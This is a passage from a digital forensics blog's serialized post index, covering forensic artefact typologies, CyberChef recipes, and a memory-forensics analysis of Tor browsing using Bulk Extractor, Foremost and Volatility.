discovered and reverse engineered.\nExamples: undocumented APIs, programming errors (e.g. encryption routines), hardware/software vulnerabilities.\n(UPDATE 22 June 2018: See this CrowdStrike blog post in relation to a previous \u0026lsquo;known unknown\u0026rsquo; on accessing additional Office 365 metadata using an undocumented API).\nIt is this last category that is potentially the most controversial. The term \u0026lsquo;forensic\u0026rsquo; stems from the Latin \u0026lsquo;forum\u0026rsquo; which was the open, public place where politics was discussed and business conducted. It is now understood to mean (in part) \u0026lsquo;relating to the courts of law\u0026rsquo;, which (in liberal democracies) should mean a transparent process that is open to scrutiny. Where does an undocumented artefact fit in this mix? What is the best way to verify this artefact? For an internal IR investigation where a company needs to identify the who/what/why/how of an incident, an undisclosed artefact may suit purposes. But what about for court? The context and end-use is critical.\nHowever forensic artefacts are categorised, thinking differently about what we are analysing can help explain the context to ourselves and our target audience. If we are all talking from the same page, then our job is half-way complete.\nIf you have other ideas or typologies for forensic artefacts, please let me know at matt@bitofhex.com or on Twitter at @mattnotmax.\n","id":13,"section":"posts","summary":"There are many ways to categorise forensic artefacts. Probably the best known (and well put) is the SANS Windows Forensics Analysis poster. This poster lists artefacts by the formula of \u0026lsquo;Evidence of\u0026hellip;'. It\u0026rsquo;s a great reference and training tool. But could we look at forensic artefacts differently? And why should we?\nBy categorising data differently, we can look at problems differently. Solving complex problems is a significant part of our work.","tags":["theory"],"title":"A Different View of Forensic Artefact Typologies","uri":"https://bitofhex.com/2018/06/18/forensic-typologies/","year":"2018"},{"content":"I have a confession to make. I am part of the CyberChef cult. When you join a cult you find yourself saying things like, \u0026ldquo;Woah! How come I didn\u0026rsquo;t know about this before?\u0026rdquo; and \u0026ldquo;Where have you been all my life!\u0026rdquo; You also spend a lot of your time proselytising to other, random people about your \u0026lsquo;fantastic\u0026rsquo; new life.\nHowever, most cults take your time, soul, and money, and only give you a glass of Kool Aid in return. CyberChef is different; CyberChef delivers. The best part is no matter what role you perform in the DFIR world, CyberChef can help you.\nCyberChef is an open source tool maintained by GCHQ. It provides a drag and drop interface via a web browser (Firefox \u0026amp; Chrome) to quickly perform a wide range of data manipulation functions called \u0026lsquo;operations\u0026rsquo;. A sequence of operations is called a \u0026lsquo;recipe\u0026rsquo;.\nAs all the processing is client-side, CyberChef can be downloaded and used offline or in an air-gapped forensic network. CyberChef has operations useful for disk forensics, malware \u0026amp; network analysts, and even OSINT researchers.\nSome (of the many) useful operations include:\nAnalyse Hash There is a range of hashing functions available in CyberChef, from MD5 and SHA1 to more esoteric options. But one great operation is \u0026lsquo;Analyse Hash\u0026rsquo; which examines a provided hash and provides possible functions that created it. One possible use case is exploring databases where developers may obfuscate user data through a hash. While it cannot provide the exact hash due to the lack of overall context, this can give you a lead on what hash function was used.\n Extract \u0026amp; Remove EXIF There are plenty of tools to extract EXIF data, my go-to option is usually exiftool. However, for simple, one-off operations CyberChef can pull EXIF from a file. OSINT researchers might find this useful as well as DFIR.\n What\u0026rsquo;s also useful is the \u0026lsquo;remove EXIF\u0026rsquo; operation. This is handy if you quickly want to ensure a photo or document doesn\u0026rsquo;t have any identifying EXIF data before you send it out.\nTo \u0026amp; From Base64 (et al.) Base64 is widespread throughout DFIR. Other types of encoding, such as Base32, have been seen in malware and some P2P applications. CyberChef has Base64/32/58 options which also allow you to enter a custom character set. This is useful for web URL data, malware, or encoding that uses its own variants.\n Data Extraction Functions CyberChef can extract IPs, email addresses, MAC addresses, URLs, domains, file paths, and EXIF data which is great for processing one-off text dumps.\nExtracting data from pastebin is a breeze:\n  Forks One less obvious task is to apply an operation to a \u0026lsquo;list\u0026rsquo; or delimited input. CyberChef uses the term \u0026lsquo;fork\u0026rsquo;, whereby you can add a delimiter for the tool to apply each operation (e.g. line by line). Below we have a list of UNIX timestamps, but only one is being converted.\n Adding the \u0026lsquo;fork\u0026rsquo; operation, fixes up the data output.\n Comments Just like normal code, comments are available to aid sharing a recipe, or simply to remind yourself how you arrived at a certain combination of operations.\n Longer Recipes More powerful use cases are stringing operations together. CyberChef provides a full range of options to create recipes which are essentially small code blocks. So you could unzip, decode Base64, and then extract certain data (e.g. IP addresses). Some great work using CyberChef recipes is explored by Ryan Benson in his Chrome forensics presentation. While the whole presentation is worth watching, his use of CyberChef starts at 11:50.\n Google ei dates Another small example of chaining operations together is converting Google \u0026lsquo;ei\u0026rsquo; encoded strings into usable date formats. As a background, Google ei dates are an encoded Base64 string containing various parameters including a Unix timestamp as recorded by Google. An example is below.\n It\u0026rsquo;s already parsed by a number of tools, but if you understand the encoding steps the recipe can be written in CyberChef.\nThe decoding is as follows:\n Convert from URL-safe Base641; Convert to hexadecimal; Take the first four hex bytes; Convert the hex bytes to little endian; Convert to decimal; and Convert from UNIX timestamp to a usable format.   These recipes can be saved for re-use in \u0026lsquo;Cyberchef format\u0026rsquo; or JSON as follows:\n[ { \"op\": \"Comment\", \"args\": [\"1. Convert from URL-safe Base64\\n2. Convert to hexadecimal\\n3. Take first 4 bytes\\n4. Switch to Little Endian format\\n5. Convert from hexadecimal to decimal\\n6. Convert to UNIX timestamp\"] }, { \"op\": \"Fork\", \"args\": [\"\\\\n\", \"\\\\n\", false] }, { \"op\": \"From Base64\", \"args\": [\"A-Za-z0-9-_=\", true] }, { \"op\": \"To Hex\", \"args\": [\"None\"] }, { \"op\": \"Take bytes\", \"args\": [0, 8, false] }, { \"op\": \"Swap endianness\", \"args\": [\"Hex\", 4, true] }, { \"op\": \"From Base\", \"args\": [16] }, { \"op\": \"From UNIX Timestamp\", \"args\": [\"Seconds (s)\"] } ] Final Thoughts This overview barely scratches the surface of CyberChef. Deobfuscating malware scripts, a quick regex, one-off log file analysis, or text normalisation are all possible. If I haven\u0026rsquo;t converted you to a CyberChef devotee, then don\u0026rsquo;t trust me! Look here, or here. Like any good cult member, I\u0026rsquo;ll point out other satisfied customers!\nThanks for reading. If you have any questions, comments or suggestions please let me know at matt@bitofhex.com or on Twitter at @mattnotmax\nRelated Links CyberChef\n  Google strips the \u0026lsquo;=\u0026rsquo; padding from the Base64 in the URL data. As we are only using the first four bytes, it is not necessary to add the padding, although this could be done for completeness by converting back to standard Base64. Of course, CyberChef can show this using the \u0026lsquo;Show Base64 offsets\u0026rsquo; operation. Check it out! \u0026#x21a9;\u0026#xfe0e;\n   ","id":14,"section":"posts","summary":"I have a confession to make. I am part of the CyberChef cult. When you join a cult you find yourself saying things like, \u0026ldquo;Woah! How come I didn\u0026rsquo;t know about this before?\u0026rdquo; and \u0026ldquo;Where have you been all my life!\u0026rdquo; You also spend a lot of your time proselytising to other, random people about your \u0026lsquo;fantastic\u0026rsquo; new life.\nHowever, most cults take your time, soul, and money, and only give you a glass of Kool Aid in return.","tags":["tools","cyberchef"],"title":"CyberChef \u0026 DFIR","uri":"https://bitofhex.com/2018/05/29/cyberchef/","year":"2018"},{"content":"In my previous post I used Volatility to examine a memory image from a hypothetical Tor user accessing webmail, the internet, and a Tor hidden service. From that analysis I could ascertain with good confidence a user of the operating system connected to the Tor network from a USB on drive E:.\nIn this post, I will continue with the same memory image but see what additional information can be revealed from data carving tools.\nBulk Extractor Bulk Extractor uses \u0026lsquo;scanners\u0026rsquo; to carve data of interest from either memory or disk images without relying on the file system. This can include URLs, emails, credit card numbers, IP addresses, network traffic and much more.\nThere is an extensive range of options available to tune the processing to your needs by enabling or disabling the various scanners. This might be necessary if you are limited by what you are allowed to search for, or have a large disk image. However, running Bulk Extractor with default options is straightforward against a small memory image such as ours: bulk_extractor -o \u0026lt;output directory\u0026gt; \u0026lt;source file\u0026gt;.\ndfir@LAPTOP:/mnt/c/BoH$ bulk_extractor -o output Win10_14393_Tor_Closed.vmem bulk_extractor version: 1.5.5 Hostname: LAPTOP Input file: Win10_14393_Tor_Closed.vmem Output directory: output Disk Size: 4294967296 Threads: 8 Attempt to open Win10_14393_Tor_Closed.vmem 15:43:18 Offset 67MB (1.56%) Done in 0:00:17 at 15:43:35 15:43:30 Offset 150MB (3.52%) Done in 0:05:30 at 15:49:00 15:43:32 Offset 234MB (5.47%) Done in 0:04:08 at 15:47:40 ***snipped*** 15:51:38 Offset 4177MB (97.27%) Done in 0:00:14 at 15:51:52 15:51:45 Offset 4261MB (99.22%) Done in 0:00:03 at 15:51:48 All data are read; waiting for threads to finish... Time elapsed waiting for 8 threads to finish: (timeout in 60 min.) All Threads Finished! Producer time spent waiting: 470.968 sec. Average consumer time spent waiting: 0.481216 sec. ******************************************* ** bulk_extractor is probably CPU bound. ** ** Run on a computer with more cores ** ** to get better performance. ** ******************************************* MD5 of Disk Image: 01b135f50fefa0de0a58704b6649e174 Phase 2. Shutting down scanners Phase 3. Creating Histograms Elapsed time: 516.226 sec. Total MB processed: 4294 Overall performance: 8.31994 MBytes/sec (1.03999 MBytes/sec/thread) Total email features found: 1103  The beauty (or fallacy!) of Bulk Extractor is it will use ~95% CPU to get the job done. This is great, but don\u0026rsquo;t expect to multi-task, especially over a big image.\n The output is placed into the specified directory and split into various text files.\ndfir@LAPTOP:/mnt/c/BoH/output$ ls -sSh total 153M 60M windirs.txt 56K url_services.txt 0 jpeg_carved.txt 0 gps.txt 59M url.txt 28K ip.txt 0 telephone_histogram.txt 0 httplogs.txt 25M domain.txt 24K ether.txt 0 ether_histogram.txt 0 kml.txt 7.2M winpe.txt 16K email_histogram.txt 0 ip_histogram.txt 0 pii_teamviewer.txt 1.1M json.txt 8.0K sqlite_carved.txt 0 ccn_histogram.txt 0 rar.txt 952K zip.txt 8.0K aes_keys.txt 0 url_searches.txt 0 unrar_carved.txt 472K url_histogram.txt 4.0K email_domain_histogram.txt 0 url_facebook-address.txt 0 unzip_carved.txt 304K packets.pcap 4.0K telephone.txt 0 alerts.txt 0 url_facebook-id.txt 188K email.txt 4.0K exif.txt 0 ccn_track2_histogram.txt 0 url_microsoft-live.txt 148K rfc822.txt 1.0K ccn.txt 0 ccn_track2.txt 0 vcard.txt 80K winlnk.txt 0 jpeg_carved 0 elf.txt 0 winprefetch.txt 80K domain_histogram.txt 0 sqlite_carved 0 find_histogram.txt 64K report.xml 0 pii.txt 0 find.txt  From the memory image, Bulk Extractor has identified 153 MB of data; however, most of this data is from a select few files. Because there is so much data the problem is actually going to be looking through it and ascertaining its meaning within the memory image (if that is at all possible).\nThis brings the analysis to an important point. In this contrived scenario, the web browsing is solely from one known session; however, this cannot be assumed in a real investigation. Any artefact from Bulk Extractor should simply be treated as an indicator. Just because a URL or email address is in the output doesn\u0026rsquo;t mean that our hypothetical user accessed it, or it\u0026rsquo;s relevant in any way.\nSearching for Tor hidden services Given the background to this investigation, we know that a user accessed the Tor network, so a logical start would be to grep in url.txt for \u0026lsquo;onion\u0026rsquo; to determine if Tor hidden services were recorded in the memory image.\ndfir@LAPTOP:/mnt/c/BoH/output$ cat url.txt | grep \"onion\" 339718862 https://www.nytimes3xbfgragh.onion/ \\x00\\x00M\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x01%\\x00\\x00\\x00 https://www.nytimes3xbfgragh.onion/\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 462190668 https://www.nytimes3xbfgragh.onion/ \\xBB\\x01\\x00\\x00\\x00\\x00\\x00\\x00#\\x00\\x00\\x00\\x00\\x00\\x00\\x00https://www.nytimes3xbfgragh.onion/\\xBF\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x08\\x00\\x00 458557510-ZIP-1599 https://3g2upl4pq6kufc4m.onion POST\" template=\"https://3g2upl4pq6kufc4m.onion\"\\x0A Param name 458557510-ZIP-1693 https://3g2upl4pq6kufc4m.onion rl\\x0ASearchForm https://3g2upl4pq6kufc4m.onion /SearchForm\\x0A/ 583230264 https://www.nytimes3xbfgragh.onion/2018/03/17/world/asia/us-technology-smuggling-foreign-weapons.html?action=click\u0026module=In%20Other%20News\u0026pgtype=Homepage\u0026action=click\u0026module=Latest\u0026pgtype=Homepage \\xBB\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\xC6\\x00\\x00\\x00\\x00\\x00\\x00\\x00https://www.nytimes3xbfgragh.onion/2018/03/17/world/asia/us-technology-smuggling-foreign-weapons.html?action=click\u0026module=In%20Other%20News\u0026pgtype=Homepage\u0026action=click\u0026module=Latest\u0026pgtype=Homepage\\xBF\\xBF\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x08\\x00 739017720 https://www.nytimes3xbfgragh.onion 6\\x00\\x00\\x00\\x03\\x00\\xFF\\xFF\"\\x00\\x00\\x80\\x04\\x00\\xFF\\xFFhttps://www.nytimes3xbfgragh.onion\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x13\\x00\\xFF\\xFF\\x0C\\x00 ***snipped and edited for display*** It\u0026rsquo;s here that we start to get an idea that there is a lot of data to cover. In fact there are 92 records containing \u0026lsquo;onion\u0026rsquo;. We can clean up this output and get an idea of the unique entries.\ndfir@LAPTOP:/mnt/c/BoH/output$ cat url.txt | grep \"onion\" | awk '{print $2}' | sort | uniq -c | sort -nr 50 https://www.nytimes3xbfgragh.onion 14 https://www.nytimes3xbfgragh.onion/ 10 https://www.nytimes3xbfgragh.onion/2018/03/17/world/asia/us-technology-smuggling-foreign-weapons.html?action=click\u0026module=In%20Other%20News\u0026pgtype=Homepage\u0026action=click\u0026module=Latest\u0026pgtype=Homepage 6 https:/01.graylady3jvrrxbe.onion 6 https://et.nytimes3xbfgragh.onion 2 https://pnytimes.chartbeat.net/ping?h=nytimes.com\u0026p=%2F2018%2F03%2F17%2Fworld%2Fasia%2Fus-technology-smuggling-foreign-weapons.html%3Faction%3Dclick%26module%3DIn%2520Other%2520News%26pgtype%3DHomepage%26action%3Dclick%26module%3DLatest%26pgtype%3DHomepage\u0026u=BbmfdHBIgFSHhtUPz\u0026d=nytimes3xbfgragh.onion\u0026g=16698\u0026g0=World%2CAsia%20Pacific%2Cinternational_desk\u0026g1=RON%20NIXON\u0026n=1\u0026f=00001\u0026c=1.75\u0026x 2 https://3g2upl4pq6kufc4m.onion 1 https://et.nytimes.com/?subject=page\u0026url=https%3A%2F%2Fwww.nytimes3xbfgragh.onion%2F\u0026assetUrl=https%3A%2F%2Fwww.nytimes3xbfgragh.onion%2F\u0026referrer=\u0026clientTimeStamp=1521372293400\u0026totalTime=272800\u0026evtUUID=35f71ccd-53d5-4880-8284-0ce4a04aaa7f\u0026page_view_id=0307636b-421f-4866-9b06-6e73d188ba1a\u0026performance=%7B%7D\u0026presentation=%7B%22pageType%22%3A%22Homepage%22%2C%22program%22%3A%7B%22breakpoint% 1 https://djdkduep62kz4nzx.onion.to/ Even though we only accessed one hidden service, https://www.nytimes3xbfgragh.onion, there are a number of other URLs and we need ascertain their relevance. A quick check of the URL prefix indicates that https://3g2upl4pq6kufc4m.onion is the DuckDuckGo search engine.\n The URL https://djdkduep62kz4nzx.onion.to is definitely weird1. According to Malware Traffic Analysis (who incidentally have great PCAP challenges!) the URL was linked in 2015 to the TeslaCrypt ransomware.2 The server might have been temporarily compromised in 2015. However, now the site is inaccessible from either Tor2Web or Tor at the time of writing.\n (As an aside the .to URL suffix with an hidden service indicates a Tor2Web address, which is a way for a user to access a Tor hidden service without running Tor. Dropping the .to will access the same site over the Tor network.)\nThe remaining onion URLs (https:/01.graylady3jvrrxbe.onion and https://www.nytimes3xbfgragh.onion) both relate to our tested browsing of the New York Times hidden service. However the large amount of URL records from simply browsing two pages reinforces the caveats on using Bulk Extractor for anything but lead generation.\nEmail Addresses The amount of noise in Bulk Extractor extends to other identifiers such as email. Even with only basic browsing, the file email_domain_histogram.txt has 218 different email domains.\ndfir@LAPTOP:/mnt/c/BoH/output$ cat email_domain_histogram.txt # BANNER FILE NOT PROVIDED (-b option) # BULK_EXTRACTOR-Version: 1.5.5 ($Rev: 10844 $) # Feature-Recorder: email # Filename: Win10_14393_Tor_Closed.vmem # Histogram-File-Version: 1.1 n=212 @eff.org n=40 @mozilla.org n=34 @torproject.org n=29 @gmail.com n=20 @ime.sy n=15 @mozilla.com n=15 @suscerte.gob.ve n=14 @chambersign.org n=12 @trustcentre.co.za n=10 @emas.me n=10 @globaltrust.info n=9 @diginotar.nl ***snipped*** One way to identify email domains of interest is to look a the frequency of the domain in the full URLs for the major webmail providers. The output file url_histogram.txt provides a frequency of URLs which can then be grepped against major webmail providers.\nFor Gmail we have two entries with low scores on the histogram (which may actually be mangled URLs concatenated together):\ndfir@LAPTOP:/mnt/c/BoH/output$ cat url_histogram.txt | grep gmail n=1 http://by137w.bay137.mail.live.com/mail/hiplight.aspx?n=http://bl103w.blu103.mail.live.com/mail/inboxlight.aspx?n=http://by142w.bay142.mail.live.com/mail/inboxlight.aspx?n=http://by137w.bay137.mail.live.com/mail/inboxlight.aspx?.mail.live.com/mail/sendmessagelight.aspx?_ec=1\u0026n=comerciodoouro@gmail.comola n=1 http://darkbreak.webcindario.comtong.pm2@gmail.comBank (utf16=1) There are similar low results for Hotmail and Yahoo, and some specialist providers like Tuta Nota or ProtonMail have no results. Searching for \u0026lsquo;live.com\u0026rsquo; produced a number of interesting entries, but not all appear to be related to email.\ndfir@LAPTOP:/mnt/c/BoH/output$ cat url_histogram.txt | grep live.com n=24 https://xsts.auth.xboxlive.com (utf16=21) n=21 https://login.live.com/ (utf16=19) n=20 https://login.live.com (utf16=18) n=11 https://xsts.auth.xboxlive.com/ (utf16=11) n=8 https://onedrive.live.com/windows/ (utf16=5) n=7 http://auth.xboxlive.com n=7 http://xboxlive.com n=7 https://account.live.com/ (utf16=5) ***snipped*** When we search for GMX we get a much larger and richer number of URLs, with much high scores in the histogram.\ndfir@LAPTOP:/mnt/c/BoH/output$ cat url_histogram.txt | grep gmx n=56 https://navigator-bs.gmx.com n=46 https://3c-bs.gmx.com n=38 https://dl.gmx.com n=36 https://home.navigator-bs.gmx.com n=36 https://trackbar.navigator-bs.gmx.com n=27 https://mailderef.gmx.com n=26 https://dl.gmx.com/uim/container/generic_dfp_gmxcom_1.html#id=0#url=https%3A//mailderef.gmx.com/dl.gmx.com/uim/container/generic_dfp_gmxcom_1.html#lcid=1521372556900233436.54056410247 n=21 https://3c-bs.gmx.com/mail/client/mail/sentconfirm;jsessionid=1E8359D02DBEE35F86F0FC0BDB82D44E-n1.bs08a?editorAction=NEW\u0026mailId=tmai151d0045aebe9761\u0026uc=SHOW_CONFIRMPAGE n=20 https://3c-bs.gmx.com/mail/client/mail/detail;jsessionid=1E8359D02DBEE35F86F0FC0BDB82D44E-n1.bs08a?5\u0026mailId=tmai151cfee574b629f3\u0026page=0\u0026sort=sort-DATE-desc\u0026folderId=tfol151997642113d811 n=19 https://dl.gmx.com/uim/container/generic_dfp_gmxcom_1.html n=16 https://3c-bs.gmx.com/mail/client/mail/compose/html?editorAction=NEW (utf16=1) n=14 https://navigator-bs.gmx.com/?sid=8f7b6d9796a1d87e18679305cba3fda03a827dbee2aa77e48455ce496cb3d5d7a81e4f34c4788802ecc6616ea4b28f69 ***snipped*** The results also show a variety of URL parameters including words like \u0026lsquo;compose\u0026rsquo;, \u0026lsquo;session\u0026rsquo; etc. which makes GMX mail more interesting. There are also references to parameter \u0026lsquo;sid\u0026rsquo;, which is likely a unique session identification hash. Testing on a throwaway GMX account indicates there likely is a new \u0026lsquo;sid\u0026rsquo; for every login.\n Now we can go back to the email.txt file and look for GMX emails.\ndfir@LAPTOP:/mnt/c/BoH/output$ cat email.txt | grep gmx dfir@LAPTOP:/mnt/c/BoH/output$ Nothing!\nIn the tradition of memory forensics there is no record for any GMX email account. Despite our hypothetical user logging into GMX mail and reading and writing messages, sometimes data simply isn\u0026rsquo;t in memory at the time of capture! This would be one to refer to the disk image or other sources of intelligence.\nNetwork Traffic Bulk extractor also carves network traffic data from memory, which can be interesting. This is saved as a .pcap file which can be read in tcpdump or Wireshark. Although for Tor traffic it is less of interest due to its encrypted nature and IP obfuscation.\nIn our scenario, there is no additional information gleamed from the Volatility netscan results with the same IP address, 54.37.17.235, recorded in the (mostly malformed) pcap traffic. The IP 40.77.228.92 resolves back to Microsoft.\n \u0026lsquo;Traditional\u0026rsquo; data carving One hindrance to memory forensics is that \u0026lsquo;traditional\u0026rsquo; file carving usually doesn\u0026rsquo;t provide good results. This kind of file carving looks for hexadecimal headers and footers to extract data and is commonly used in disk forensics. However, unlike disk forensics, memory is fragmented and not all of the data may be in memory at the times of capture. The \u0026lsquo;bible\u0026rsquo; of memory forensics explains this succinctly:\n Occasionally, people still attempt to reconstruct a file from a memory sample using traditional file carving tools, such as Scalpel\u0026hellip;Unfortunately, most of these tools assume the file data is contiguous and that the media being analyzed contains a whole copy of the file\u0026hellip;As a result except for files smaller than one page of memory, you are probably not going to extract the data you expect.\nThe Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux and Mac in Memory, p.494\n So, if we tried, what would we get? Foremost is data carving utility which will carve picture, document, executables, ZIP/RAR, HTML or audio files. It is simple and quick to run and places each file type in output folders.\nHere I will attempt to carve for picture and HTML data.\ndfir@LAPTOP:/mnt/c/BoH$ foremost -t jpg,htm,gif,png -v -i Win10_14393_Tor_Closed.vmem -o foremost Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus Audit File Foremost started at Tue May 1 09:31:44 2018 Invocation: foremost -t jpg,htm,gif,png -v -i Win10_14393_Tor_Closed.vmem -o foremost Output directory: /mnt/c/BoH/foremost Configuration file: /etc/foremost.conf Processing: Win10_14393_Tor_Closed.vmem |------------------------------------------------------------------ File: Win10_14393_Tor_Closed.vmem Start: Tue May 1 09:32:12 2018 Length: 4 GB (4294967296 bytes) Num Name (bs=512) Size File Offset Comment 0: 00009856.png 1 KB 5046368 (36 x 36) 1: 00009859.png 1 KB 5048104 (48 x 48) 2: 00092377.png 198 B 47297024 (50 x 50) 3: 00092378.png 224 B 47298032 (44 x 44) 4: 00092381.png 224 B 47299120 (44 x 44) 5: 00092383.png 136 B 47300160 (16 x 16) 6: 00104370.png 452 B 53437746 (16 x 16) 7: 00104371.png 1005 B 53438301 (32 x 32) 8: 00104373.png 485 B 53439397 (16 x 16) 9: 00144140.png 209 B 73799772 (9 x 5) 10: 00144141.png 215 B 73800560 (9 x 5) ***snipped*** 560: 08269196_1.htm 236 B 4233828859 561: 08269197.htm 269 B 4233829195 562: 08269198.htm 247 B 4233829563 563: 08269199.htm 250 B 4233829915 564: 08269199_1.htm 3 KB 4233830267 565: 08269206.htm 281 B 4233833931 566: 08214113.gif 6 KB 4205626344 (1168 x 769) 567: 08212180.png 353 B 4204636576 (310 x 150) 568: 08212182.png 502 B 4204637616 (310 x 150) Finish: Tue May 1 09:32:33 2018 569 FILES EXTRACTED jpg:= 1 htm:= 41 gif:= 23 png:= 504 Foremost finished at Tue May 1 09:32:33 2018 Data was \u0026lsquo;found\u0026rsquo; but as expected, the results are limited. No useful HTML or picture files were located. However, it did carve a number of small icons which could potentially be useful to either identify a hidden service of interest (e.g. a logo or a user avatar). For cases of child exploitation Foremost could be of greater interest, but ultimately it\u0026rsquo;s not the solution.\nIf we want to \u0026lsquo;carve\u0026rsquo; files in memory we can return to Volatility and use the dumpfiles plugin. The syntax is vol.py -f \u0026lt;filename\u0026gt; --profile=\u0026lt;profile\u0026gt; dumpfiles -n -D ./\u0026lt;output_path\u0026gt; -r \u0026lt;regex_value\u0026gt; Here the -n appends the name of the original file and -r is using a regular expression to limit the output.\nResults may still be limited. My attempts to locate HTML, GIF, JPG, and sqlite files all fail to locate any data.\nHowever turning to Windows system files, using dumpfiles against Event Logs produced a good output to examine.\ndfir@LAPTOP:/mnt/c/BoH$ vol.py -f Win10_14393_Tor_Closed.vmem --profile=Win10x64_14393 dumpfiles -n -D ./dump -r .evtx Volatility Foundation Volatility Framework 2.6 DataSectionObject 0xffff80814be1c460 908 \\Device\\HarddiskVolume1\\Windows\\System32\\winevt\\Logs\\System.evtx SharedCacheMap 0xffff80814be1c460 908 \\Device\\HarddiskVolume1\\Windows\\System32\\winevt\\Logs\\System.evtx DataSectionObject 0xffff80814be23080 908 \\Device\\HarddiskVolume1\\Windows\\System32\\winevt\\Logs\\Application.evtx SharedCacheMap 0xffff80814be23080 908 \\Device\\HarddiskVolume1\\Windows\\System32\\winevt\\Logs\\Application.evtx DataSectionObject 0xffff80814be24c80 908 \\Device\\HarddiskVolume1\\Windows\\System32\\winevt\\Logs\\Security.evtx SharedCacheMap 0xffff80814be24c80 908 \\Device\\HarddiskVolume1\\Windows\\System32\\winevt\\Logs\\Security.evtx ***snipped*** Located in the Security Event log was a reference to torbrowser-install-7.5.2_en-US.exe.\n As the log was only partially complete, as is common, and Windows Event Log Viewer failed load the log to view it natively. By reviewing baseline data (being logs from my Windows installation) and handy research previously done here, the key fields (for this log) can be broken down as follows:\n   Offset (decimal) Data Type Length (bytes) Hex Data Converted Data / Comment     0 Event Record Signature 4 2A2A0000 Hex Signature   4 Event Record Size 4 60020000 608 bytes (LE)   8 Event Record Identifier 8 D801000000000000 472 (LE)   16 Windows FILETIME written 8 177D4A5BAABED301 18 March 2018, 11:15:00 UTC   24 Binary Data Header 4 0F010100 Hex Signature   118 Event ID 2 BE 12 4798   130 Windows FILETIME event created 8 177D4A5BAABED301 18 March 2018, 11:15:00 UTC   171 Event Log Provider Name 70 UTF-16 N/A   257 Event Log Channel 16 UTF-16 N/A   365 Target SID 28 010500000000000515000000 EB45C98E2A11D64863E30076E8030000 S-1-05-5-21-2395555307- 705812040-1221988650-1979769699-1000   393 Subject User SID 28 010500000000000515000000 EB45C98E2A11D64863E30076E8030000 S-1-05-5-21-2395555307- 705812040-1221988650-1979769699-1000   421 Subject User Name 8 UTF-16 N/A   431 Subject User Domain 30 UTF-16 N/A   479 Caller process name 116 UTF-16 N/A   604 Event Record Size (Footer) 4 60020000 608 bytes (LE)    Which corresponds to the event log fragment as follows:\n The actual event (in this circumstance) is not particularly interesting \u0026lsquo;Event 4798 - A user\u0026rsquo;s local group membership was enumerated\u0026rsquo;. The presence of the log and the FILETIME stamp provides another interesting data point for a timeline. It also provides additional information that the Tor Browser Bundle installer was located on HarddiskVolume2, which may or may not be the same USB as the installed files. The date stamp, 18 March 2018, 11:15:00 UTC, indicates that the timing is definitely consistent to the other timestamps identified in this analysis (e.g. from the $MFT).\nHaving taken the time to parse out the hex in the event log fragment, I thought it might be useful to carve similar Event Log fragments via a script. The result is a simple Python script, event_carver.py, which searches a binary file (usually a .evtx file that is corrupted or zero padded) and locates the event record signature x\\2Ax\\2Ax\\00x\\00. It will then parse and extract some key fields including the record offset within the file, event log ID, and timestamp. The event fragment is then dumped into an \u0026lsquo;output\u0026rsquo; folder for manual inspection.\n(It certainly doesn\u0026rsquo;t appear to be as comprehensive as either EVTXract or python-evtx neither of which I have tested at this time.)\nThe output looks as follows:\nc:\\Scripts\\event_carverpython event_carver.py test.bin Located header at offset: 0x1200 Located header at offset: 0x1cf0 Located header at offset: 0x31200 Located header at offset: 0x31b48 Located header at offset: 0x31d78 Located header at offset: 0x321f0 Located header at offset: 0x32458 **snipped** Located header at offset: 0x5f938 Located header at offset: 0x5fc28 Located header at offset: 0x60020 Located header at offset: 0x60310 Located 139 Windows Event Record fragments Event carver completed at 10:45:39, 08-May-2018 The output folder will appear as:\nc:\\Scripts\\event_carver\\outputdir /d /b events_summary.csv offset_0x1200_2018-03-08.bin offset_0x1cf0_2018-03-08.bin offset_0x31200_2018-03-07.bin offset_0x31b48_2018-03-07.bin offset_0x31d78_2018-03-07.bin **snipped** The script should only be used as a first triage, as it\u0026rsquo;s blindly looking at values that may be empty or corrupted. At this stage there is significant variability in the remaining binary content of the EVTX record so I haven\u0026rsquo;t yet attempted to parse this data out. (Otherwise, I\u0026rsquo;d never get this post out!)\nSummary There is almost endless analysis that could be done with the Bulk Extractor output. Most likely (and useful) is to put the output into a word list which you can then run over the physical image or against password protected files. This could either be a selection of data, or through enabling the word list option on initial processing via bulk extractor -e wordlist -o \u0026lt;output directory\u0026gt; \u0026lt;source file\u0026gt;.\nTraditional data carving is unlikely to produce quality results, as the testing with Foremost demonstrated. Instead, using Volatility dumpfiles can assist.\nThat\u0026rsquo;s all for this two-part series on analysing Tor artefacts in memory images. In traditional DFIR fashion it started as looking at Tor and ended with carving event records. You never know where you end up!\nPlease feel free to share your thoughts or comments at matt@bitofhex.com or via Twitter at @mattnotmax. Thanks for reading!\nRelated Links Bulk Extractor\nForemost\nDCode\nIncorporating Disk Forensics with Memory Forensics - Bulk Extractor (proof that everything old is new again!)\nMonkey Unpacks Some Python (thanks for the Python tips!)\npython-evtx\n  Not a technical term to put in the final report! \u0026#x21a9;\u0026#xfe0e;\n See https://www.malware-traffic-analysis.net/2015/09/02/index.html \u0026#x21a9;\u0026#xfe0e;\n   ","id":15,"section":"posts","summary":"In my previous post I used Volatility to examine a memory image from a hypothetical Tor user accessing webmail, the internet, and a Tor hidden service. From that analysis I could ascertain with good confidence a user of the operating system connected to the Tor network from a USB on drive E:.\nIn this post, I will continue with the same memory image but see what additional information can be revealed from data carving tools.","tags":["memory forensics","tor"],"title":"Memory Forensics \u0026 Tor (part two)","uri":"https://bitofhex.com/2018/05/10/memory-forensics-tor-part-two/","year":"2018"},{"content":"Memory forensics is a powerful tool. All executed code and data passes through RAM which makes it perfect for hunting malware. Most discussion on memory forensics is focused (rightly) on malware analysis, and the benefits of memory forensics for non-malware scenarios have been less publicised.\nOften, a lack of understanding of the benefits of memory forensics has pervaded internal investigations or law enforcement. There is a tendency to think, “we’ve got the whole box, so why would we need the memory?”\nIt is true that registry, prefetch, NTFS metadata, and an array of other artefacts can provide a rich set of data for any investigation; however, certain scenarios can highlight the benefit of memory forensics. In this case study I’ll look at a scenario of a user running Tor Browser Bundle 